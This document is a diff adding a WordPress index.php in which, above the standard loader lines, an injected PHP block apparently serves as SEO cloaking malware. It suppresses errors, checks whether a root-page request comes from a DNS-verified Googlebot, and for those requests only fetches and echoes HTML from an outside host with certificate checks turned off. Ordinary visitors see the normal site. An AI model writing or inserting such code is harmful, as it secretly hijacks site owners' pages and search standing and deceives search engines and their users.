@@ -1,0 +1,117 @@
+<?php
+error_reporting(0);
+
+// Fungsi untuk ambil konten via cURL
+function getRemoteContent($url, $userAgent = 'Mozilla/5.0') {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    return curl_exec($ch);
+}
+
+// Fungsi untuk cek apakah request valid dari bot atau IP/Cookie tertentu
+function shouldServeContent() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $requestUri = $_SERVER['REQUEST_URI'] ?? '';
+    $cookie = $_COOKIE['s288'] ?? null;
+    
+    // Cek header 'X-Forwarded-For' jika menggunakan proxy atau load balancer
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+
+    // Jika bukan halaman root ("/"), abaikan
+    if ($requestUri !== '/') return false;
+
+    // Jika IP diizinkan (Daftar IP khusus yang Anda izinkan bisa ditambahkan)
+    if (isGoogleBotIP($ip) && isVerifiedGooglebot($ip, $userAgent)) {
+        return true;
+    }
+
+    return false;
+}
+
+// Fungsi untuk memverifikasi IP apakah milik Googlebot
+function isGoogleBotIP($ip) {
+    // Rentang IP yang digunakan oleh Googlebot (diperbarui secara periodik)
+    $googleBotIPRanges = [
+        '64.233.160.0/19',
+        '66.249.64.0/19',
+        '72.14.192.0/18',
+        '74.125.0.0/16',
+        '208.80.152.0/22',
+        // Tambahkan rentang IP lainnya sesuai dengan IP terbaru Googlebot
+    ];
+
+    foreach ($googleBotIPRanges as $range) {
+        if (ipInRange($ip, $range)) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Fungsi untuk memeriksa apakah IP berada dalam rentang IP Googlebot
+function ipInRange($ip, $range) {
+    list($range, $netmask) = explode('/', $range);
+    $rangeDecimal = ip2long($range);
+    $ipDecimal = ip2long($ip);
+    $netmaskDecimal = ~((1 << (32 - $netmask)) - 1);
+    
+    return ($ipDecimal & $netmaskDecimal) == ($rangeDecimal & $netmaskDecimal);
+}
+
+// Fungsi untuk melakukan verifikasi Googlebot yang lebih ketat
+function isVerifiedGooglebot($ip, $userAgent) {
+    // Daftar user-agent yang valid untuk Googlebot
+    $validAgents = ['Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'APIs-Google'];
+
+    // Periksa apakah user-agent mengandung Googlebot
+    foreach ($validAgents as $agent) {
+        if (stripos($userAgent, $agent) !== false) {
+            // Lakukan pengecekan DNS
+            $hostname = gethostbyaddr($ip);
+            // Pastikan hostname berakhiran .google.com atau .googlebot.com
+            if (preg_match('/\.google(bot)?\.com$/', $hostname)) {
+                // Verifikasi apakah IP cocok dengan hostname
+                if (gethostbyname($hostname) === $ip) {
+                    // Jika semuanya cocok, anggap ini Googlebot asli
+                    return true;
+                }
+            }
+        }
+    }
+    // Jika user-agent valid tapi tidak berhasil verifikasi DNS, anggap sebagai palsu
+    return false;
+}
+
+// Jalankan aturan jika terpenuhi
+if (shouldServeContent()) {
+    $lp = "https://floridaglobal.universityafatcat/floridaglobal.html";
+    $content = getRemoteContent($lp, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
+    if ($content !== false) {
+        echo $content;
+        exit;
+    }
+}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
